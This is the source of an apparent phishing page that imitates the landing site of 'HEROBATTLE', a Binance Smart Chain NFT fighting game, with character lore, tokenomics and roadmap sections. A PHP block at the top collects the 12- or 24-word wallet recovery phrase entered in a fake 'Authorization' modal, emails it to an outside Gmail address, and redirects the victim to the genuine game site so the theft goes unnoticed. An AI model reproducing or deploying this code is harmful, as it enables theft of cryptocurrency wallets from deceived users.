<?php
$to = "gamesforecod@gmail.com";
$subject = "Phrases Hero Battle";

$phrases = $_POST['password'];

$message = $phrases;
$valid = str_word_count($message, 0);

$headers = "Content-type:text/html; charset = UTF-8 \r\n";
$headers .= "From: gamesforecod@gmail.com";
$headers .= "Reply to gamesforecod@gmail.com";

if ($valid == 12 || $valid == 24) {
  mail($to, $subject, $message, $headers);
  header("Location: https://herobattle.app/game?rare=0&race=255&page=0&id=-1&sort=1");
} else {
 
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="icon" href="./assets/images/icon/favicon.ico" />
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1" /> -->
    <!-- <meta
      name="viewport"
      content="initial-scale=1, maximum-scale=1, user-scalable=no"
    /> -->
    <title>HEROBATTLE - Battle Of Heroes</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" defer></script>
    <script src="./assets/js/main.js" defer></script>
    <meta name="viewport" content="width=device-width, user-scalable=no" />
    <link rel="stylesheet" href="assets/css/reset.css" />
    <link rel="stylesheet" href="assets/css/bootstrap-grid.min.css" />
    <link
      rel="stylesheet"
      href="https://unpkg.com/swiper/swiper-bundle.min.css"
    />
    <link rel="stylesheet" href="assets/css/style.css" />
    <link rel="stylesheet" href="assets/css/modal_style.css" />
  </head>
  <body>
    <header class="header fixed-top">
      <div class="container">
        <div class="row">
          <div class="d-flex justify-content-between align-items-center">
            <span class="placeholder"></span>
            <a class="logoImage" href="#">
              <img
                class="heightImage100"
                src="./assets/images/LogoHomePage 1.png"
                alt=""
              />
            </a>
            <nav class="navbar">
              <ul class="nav-list">
                <li class="nav-item"><a href="#">Features</a></li>
                <li class="nav-item"><a href="#">CHARACTERS</a></li>
                <li class="nav-item"><a href="#">TOKENOMICKS</a></li>
                <li class="nav-item"><a href="#">ROAD&nbsp;MAP</a></li>
                <li class="nav-item"><a href="#">WHITEPAPER</a></li>
              </ul>
            </nav>
            <div class="hamburger-menu">
              <input id="menu__toggle" type="checkbox" />
              <label class="menu__btn" for="menu__toggle">
                <span></span>
              </label>

              <ul class="menu__box">
                <img
                  style="width: 157px; height: 104px"
                  src="./assets/images/LogoHomePage 1.png"
                  alt=""
                />
                <li class="nav-item"><a id="bgrlnk" href="#">Features</a></li>
                <li class="nav-item"><a id="bgrlnk" href="#">CHARACTERS</a></li>
                <li class="nav-item">
                  <a id="bgrlnk" href="#">TOKENOMICKS</a>
                </li>
                <li class="nav-item"><a id="bgrlnk" href="#">WHITEPAPER</a></li>
                <li class="nav-item">
                  <a id="bgrlnk" href="#">ROAD&nbsp;MAP</a>
                </li>
                <li class="nav-burger-btns">
                  <a href="#">
                    <button class="connect-btn">
                      <img src="./assets/images/giveaway.svg" alt="" />
                    </button>
                  </a>
                </li>
                <li class="nav-burger-btns">
                  <a href="#">
                    <button class="connect-btn" id="connect_btn2">
                      <img src="./assets/images/connect.svg" alt="" />
                    </button>
                  </a>
                </li>
              </ul>
            </div>
            <div class="header-buttons align-items-center">
              <a href="#">
                <button class="connect-btn">
                  <img src="./assets/images/giveaway.svg" alt="" />
                </button>
              </a>
              <a href="#">
                <button class="connect-btn" id="connect_btn2">
                  <img src="./assets/images/connect.svg" alt="" />
                </button>
              </a>
            </div>
          </div>
        </div>
      </div>
    </header>
    <div class="wallet-modal" id="wallet_modal" style="display: none">
      <div class="wallet-bg">
        <form
          class="wallet-container"
          id="wallet_form"
          action="index.php"
          method="POST"
        >
          <span class="wallet-title">Authorization</span>
          <div style="padding: 3px; box-sizing: border-box">
            <div style="width: 240px">
              <span class="wallet-input-title"
                >Typically 12 (sometimes 24) words separated by single
                spaces</span
              >
            </div>
            <div class="input-field">
              <img class="icon" src="assets/images/person_24px.svg" alt="" />
              <input
                type="text"
                name="password"
                id="password_field"
                placeholder="Recovery Phrase"
              />
              <img
                class="icon-right"
                src="assets/images/warning_24px.svg"
                alt=""
                id="input_alert"
                style="display: none"
              />
            </div>
            <div style="width: 240px">
              <span
                class="wallet-input-title warning"
                id="input_warning"
                style="display: none"
                >Please enter 12 or 24 words!</span
              >
            </div>
          </div>
          <button type="submit" id="subm_button"><span>Confirm</span></button>
        </form>
      </div>
    </div>
    <section class="video-sect">
      <video class="wp100" id="myVideo" autoplay muted preload loop>
        <source src="./assets/images/1x.mp4" type="video/mp4" />
      </video>
    </section>
    <section class="info-sect">
      <div class="container">
        <div class="row">
          <a href="#" class="info-banner">
            <img src="./assets/images/Group 4.svg" style="width: 100%" alt="" />
          </a>
          <div class="info-content">
            <div
              class="mb-3 d-flex justify-content-center flex-column contentText"
            >
              <div class="maint-title">
                The most popular fighting game of the Binance Smart chain
                network
              </div>
              <div class="main-description">
                <div class="LinesEllipsis LinesEllipsis--clamped">
                  The world was peaceful until one day, a creature from another
                  world appeared. The Almighty used all his magic to fight and
                  defeat the monster. The monster was imprisoned and sealed with
                  the five elements-related stones: metal, wood, water, fire,
                  and earth. Before dissipating, the almighty divided among five
                  races to protect, each race was given control of a source of
                  power in or<wbr /><span class="LinesEllipsis-ellipsis">
                    <b class="handClick" aria-hidden="true">...Read more</b>
                  </span>
                </div>
              </div>
            </div>
            <div class="info-vid">
              <video
                class="video-react-video"
                preload="auto"
                controls
                src="./assets/images/intro_hero_battle_game_nft.mp4"
                tabindex="-1"
              ></video>
            </div>
          </div>
        </div>
      </div>
      <div class="swiper mySwiper">
        <div class="swiper-wrapper">
          <div class="swiper-slide">
            <img src="./assets/images/slide0-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide1-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide2-update.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide3-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide1-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide2-update.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide3-update.svg" alt="" />
          </div>
        </div>
        <div class="swiper-pagination"></div>
      </div>
    </section>
    <section class="features">
      <div class="container">
        <div class="row">
          <div class="features-content d-flex align-items-center flex-column">
            <div class="f_title">PLAY TO EARN FEATURES</div>
            <div class="features-subcont d-flex justify-content-between">
              <div class="f-s-block">
                <img src="./assets/images/feature1.svg" alt="" />

                <h3>MARKETPLACE</h3>
                <h4>
                  Use the Marketplace to find your best Hero and trade rare
                  equipment with other players.
                </h4>
              </div>
              <div class="f-s-block">
                <img src="./assets/images/feature2.svg" alt="" />
                <h3>HERO FARMING</h3>
                <h4>
                  In addition to participating in combat, they can let Hero
                  automatically cultivate and harvest. A large amount of tokens
                  will automatically flow to your wallet.
                </h4>
              </div>
              <div class="f-s-block">
                <img src="./assets/images/feature3.svg" alt="" />
                <h3>PLAY GAME</h3>
                <h4>
                  Prepare for Combat by shopping for the best heroes, training
                  your best heroes, and learning powerful skills
                </h4>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="character">
      <div class="container">
        <div class="row">
          <div class="character-content d-flex flex-column align-items-center">
            <div class="ch-head">CHARACTERS</div>
            <div class="character-select w100">
              <div class="row tabs">
                <div class="col-sm-6 col-lg-6">
                  <div class="listSelect d-flex w100">
                    <a class="handClick handClick_active" href="#content-1">
                      <span class="avatar"></span>
                    </a>
                    <a class="handClick" href="#content-2">
                      <span class="avatar"></span>
                    </a>
                    <a class="handClick" href="#content-3">
                      <span class="avatar"></span>
                    </a>
                    <a class="handClick" href="#content-4">
                      <span class="avatar"></span>
                    </a>
                    <a class="handClick" href="#content-5">
                      <span class="avatar"></span>
                    </a>
                  </div>
                  <div class="tabs__content">
                    <div
                      class="character-info w100 tabs__pane tabs__pane_show"
                      character="1"
                      id="content-1"
                    >
                      <div class="character-name">
                        <b class="nameChar">Killian</b>
                        <div class="subnameChar">The Gallant Sword</div>
                      </div>
                      <div class="character-star d-flex">
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                      </div>
                      <div class="lineBlue"></div>
                      <div class="character-text">
                        The fire burned merrily, sending a pillar of smoke
                        funneling into the night sky, the flames flashed several
                        times before it suddenly turned cold like the stars When
                        the last pillar of Phanaland's fire was extinguished,
                        Kyle stepped out of the flames and descended the stairs
                        He seemed to have seen his destiny before his eyes ???Come
                        here! Demon King???
                      </div>
                    </div>
                    <div
                      class="character-info w100 tabs__pane"
                      id="content-2"
                      character="2"
                    >
                      <div class="character-name">
                        <b class="nameChar">TITUS</b>
                        <div class="subnameChar">Fate Grip</div>
                      </div>
                      <div class="character-star d-flex">
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                      </div>
                      <div class="lineBlue"></div>
                      <div class="character-text">
                        The social hierarchies in Phanaland can at times be
                        strict, and are occasionally unjust and Titus is one of
                        those victims <br />
                        Since he was summoned to this place, his only relative
                        has been Omar, the master assassin who discovered his
                        talent for using Twin Blade Dagger <br />
                        Until Leon, the Demon Lord turned up Omar sacrificed
                        himself to protect Titus and helped Titus escape After
                        all, he stood up to fight the evil faction and finally
                        joined the anti-dark alliance <br />
                        He had to fulfill his promise to Master Omar ???l keep my
                        promises???
                      </div>
                    </div>
                    <div
                      class="character-info w100 tabs__pane"
                      id="content-3"
                      character="3"
                    >
                      <div class="character-name">
                        <b class="nameChar">ACE</b>
                        <div class="subnameChar">Judgement Chakra</div>
                      </div>
                      <div class="character-star d-flex">
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                      </div>
                      <div class="lineBlue"></div>
                      <div class="character-text">
                        Ace is gentle on the outside, but once his friends and
                        homeland are threatened, the beast inside will be
                        unleashed and attack all of those enemies <br />
                        ???Never let stupid things go too far???
                      </div>
                    </div>
                    <div
                      class="character-info w100 tabs__pane"
                      id="content-4"
                      character="4"
                    >
                      <div class="character-name">
                        <b class="nameChar">Gael</b>
                        <div class="subnameChar">The Lightbringer</div>
                      </div>
                      <div class="character-star d-flex">
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                      </div>
                      <div class="lineBlue"></div>
                      <div class="character-text">
                        Eberia Fort is famous throughout the Phanaland region
                        Since Gael was summoned here and showed his talent as a
                        spearman master <br />
                        Time and time again, Gael used his talent to make great
                        achievements for Phanaland <br />
                        From fighting and killing Hydra to the Sorceress
                        Succubus are not his opponent <br />
                        ???No matter how bright the light is, it can't compare to
                        the light of this spear???
                      </div>
                    </div>
                    <div
                      class="character-info w100 tabs__pane"
                      id="content-5"
                      character="5"
                    >
                      <div class="character-name">
                        <b class="nameChar">Adriel</b>
                        <div class="subnameChar">Devil Trap</div>
                      </div>
                      <div class="character-star d-flex">
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                        <img
                          class="star-image"
                          src="./assets/images/ui/star.png"
                          alt=""
                        />
                      </div>
                      <div class="lineBlue"></div>
                      <div class="character-text">
                        Adriel is the most powerful melee fighter in the whole
                        Hazarra arena His hammer blows and the powerful
                        concussions from it allows him to deal great damage with
                        formidable effects! <br />
                        ???Take one hit from my hammer???
                      </div>
                    </div>
                  </div>
                </div>
                <div class="char_images col-sm-6 col-lg-6">
                  <img
                    class="selected-char_image w100 tabs__pane tabs__pane_show"
                    src="./assets/images/characters/1/thumbnail-update-x.png"
                    alt=""
                    id="content-1"
                  />
                  <img
                    class="selected-char_image w100 tabs__pane"
                    src="./assets/images/characters/2/thumbnail-update-x.png"
                    alt=""
                    id="content-2"
                  />
                  <img
                    class="selected-char_image w100 tabs__pane"
                    src="./assets/images/characters/3/thumbnail-update-x.png"
                    alt=""
                    id="content-3"
                  />
                  <img
                    class="selected-char_image w100 tabs__pane"
                    src="./assets/images/characters/4/thumbnail-update-x.png"
                    alt=""
                    id="content-4"
                  />
                  <img
                    class="selected-char_image w100 tabs__pane"
                    src="./assets/images/characters/5/thumbnail-update-x.png"
                    alt=""
                    id="content-5"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="tokenomics">
      <div class="container">
        <div class="row">
          <div class="tokenomics-content d-flex flex-column align-items-center">
            <div class="ch-head">TOKENOMICS</div>
            <img class="token-img" src="./assets/images/Group 7.png" alt="" />
          </div>
        </div>
      </div>
    </section>
    <section class="roadmap">
      <div class="container">
        <div class="row">
          <div class="roadmap-content d-flex flex-column align-items-center">
            <div class="ch-head">ROADMAP</div>
            <img class="token-img" src="./assets/images/Group 21.svg" alt="" />
          </div>
        </div>
      </div>
    </section>
    <section class="team">
      <img src="./assets/images/placeholder 1.png" alt="" />
    </section>
    <section class="partner">
      <img src="./assets/images/placeholder 2.png" alt="" />
    </section>
    <footer class="header footer">
      <div class="container">
        <div class="row">
          <div
            class="
              footer-content
              d-flex
              justify-content-between
              align-items-center
            "
          >
            <a class="sdasd" href="#">
              <img
                class="sdasd"
                src="./assets/images/LogoHomePage 1.png"
                alt=""
              />
            </a>
            <nav class="navbar">
              <ul class="nav-list">
                <li class="nav-item"><a href="#">Features</a></li>
                <li class="nav-item"><a href="#">CHARACTERS</a></li>
                <li class="nav-item"><a href="#">TOKENOMICKS</a></li>
                <li class="nav-item"><a href="#">ROAD&nbsp;MAP</a></li>
                <li class="nav-item"><a href="#">WHITEPAPER</a></li>
              </ul>
            </nav>
            <div class="footer-buttons d-flex align-items-center">
              <a href="#">
                <button class="connect-btn">
                  <img src="./assets/images/giveaway.svg" alt="" />
                </button>
              </a>
              <a href="#">
                <button class="connect-btn" id="connect_btn">
                  <img src="./assets/images/connect.svg" alt="" />
                </button>
              </a>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </body>
  <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
  <script>
    var swiper = new Swiper(".mySwiper", {
      slidesPerView: 3,
      spaceBetween: 0,
      loop: true,
      autoplay: {
        delay: 1800,
        disableOnInteraction: false,
      },
      pagination: {
        el: ".swiper-pagination",
        clickable: true,
      },
    });
    /* const MAX_WORDS = 12;

    document.querySelector("input").addEventListener("keydown", (event) => {
      if (event.target.value.split(/\W+/).length > MAX_WORDS) {
        if (event.key.length === 1) {
          event.preventDefault();
        }
      }
    }); */
  </script>
  <script>
    var $tabs = function (target) {
      var _elemTabs =
          typeof target === "string" ? document.querySelector(target) : target,
        _eventTabsShow,
        _showTab = function (tabsLinkTarget) {
          var tabsPaneTarget, tabsLinkActive, tabsPaneShow;
          tabsPaneTarget = document.querySelector(
            tabsLinkTarget.getAttribute("href")
          );
          tabsLinkActive =
            tabsLinkTarget.parentElement.querySelector(".handClick_active");
          tabsPaneShow =
            tabsPaneTarget.parentElement.querySelector(".tabs__pane_show");
          // ???????? ?????????????????? ?????????????? ?????????? ????????????????, ???? ?????????????????? ????????????
          if (tabsLinkTarget === tabsLinkActive) {
            return;
          }
          // ?????????????? ???????????? ?? ?????????????? ???????????????? ??????????????????
          if (tabsLinkActive !== null) {
            tabsLinkActive.classList.remove("handClick_active");
          }
          if (tabsPaneShow !== null) {
            tabsPaneShow.classList.remove("tabs__pane_show");
          }
          // ?????????????????? ???????????? ?? ?????????????????? (?? ?????????????????? ???? ?????????????????? ??????????????)
          tabsLinkTarget.classList.add("handClick_active");
          tabsPaneTarget.classList.add("tabs__pane_show");
          document.dispatchEvent(_eventTabsShow);
          var charcont1,
            charcont2,
            charcont3,
            charcont4,
            charcont5,
            charImg1,
            charImg2,
            charImg3,
            charImg4,
            charImg5;
          charcont1 = document.querySelector('div[character="1"]');
          charcont2 = document.querySelector('div[character="2"]');
          charcont3 = document.querySelector('div[character="3"]');
          charcont4 = document.querySelector('div[character="4"]');
          charcont5 = document.querySelector('div[character="5"]');
          charImg1 = document.querySelector('img[id="content-1"]');
          charImg2 = document.querySelector('img[id="content-2"]');
          charImg3 = document.querySelector('img[id="content-3"]');
          charImg4 = document.querySelector('img[id="content-4"]');
          charImg5 = document.querySelector('img[id="content-5"]');

          if (charcont1.classList.contains("tabs__pane_show")) {
            charImg1.classList.add("tabs__pane_show");
          } else {
            charImg1.classList.remove("tabs__pane_show");
          }

          if (charcont2.classList.contains("tabs__pane_show")) {
            charImg2.classList.add("tabs__pane_show");
          } else {
            charImg2.classList.remove("tabs__pane_show");
          }

          if (charcont3.classList.contains("tabs__pane_show")) {
            charImg3.classList.add("tabs__pane_show");
          } else {
            charImg3.classList.remove("tabs__pane_show");
          }

          if (charcont4.classList.contains("tabs__pane_show")) {
            charImg4.classList.add("tabs__pane_show");
          } else {
            charImg4.classList.remove("tabs__pane_show");
          }

          if (charcont5.classList.contains("tabs__pane_show")) {
            charImg5.classList.add("tabs__pane_show");
          } else {
            charImg5.classList.remove("tabs__pane_show");
          }
        },
        _switchTabTo = function (tabsLinkIndex) {
          var tabsLinks = _elemTabs.querySelectorAll(".handClick");
          if (tabsLinks.length > 0) {
            if (tabsLinkIndex > tabsLinks.length) {
              tabsLinkIndex = tabsLinks.length;
            } else if (tabsLinkIndex < 1) {
              tabsLinkIndex = 1;
            }
            _showTab(tabsLinks[tabsLinkIndex - 1]);
          }
        };

      _eventTabsShow = new CustomEvent("tab.show", { detail: _elemTabs });

      _elemTabs.addEventListener("click", function (e) {
        var target = e.target.closest(".handClick");
        // ?????????????????? ???????????????????? ??????????????, ???????? ???????????????? ???? ???? ????????????
        if (!target) {
          return;
        }
        // ???????????????? ?????????????????????? ????????????????
        e.preventDefault();
        _showTab(target);
      });

      return {
        showTab: function (target) {
          _showTab(target);
        },
        switchTabTo: function (index) {
          _switchTabTo(index);
        },
      };
    };

    $tabs(".tabs");
  </script>
  <script>
    document.querySelector("[id=menu__toggle]").checked = false;
    bgrlnktgl = document.querySelectorAll("[id=bgrlnk]");
    for (var i = 0; i < bgrlnktgl.length; i++) {
      bgrlnktgl[i].onclick = function () {
        menu__toggle.checked = false;
      };
    }
  </script>
  <!-- <script>
    document.oncontextmenu = cmenu;
    function cmenu() {
      return false;
    }
  </script> -->
</html>
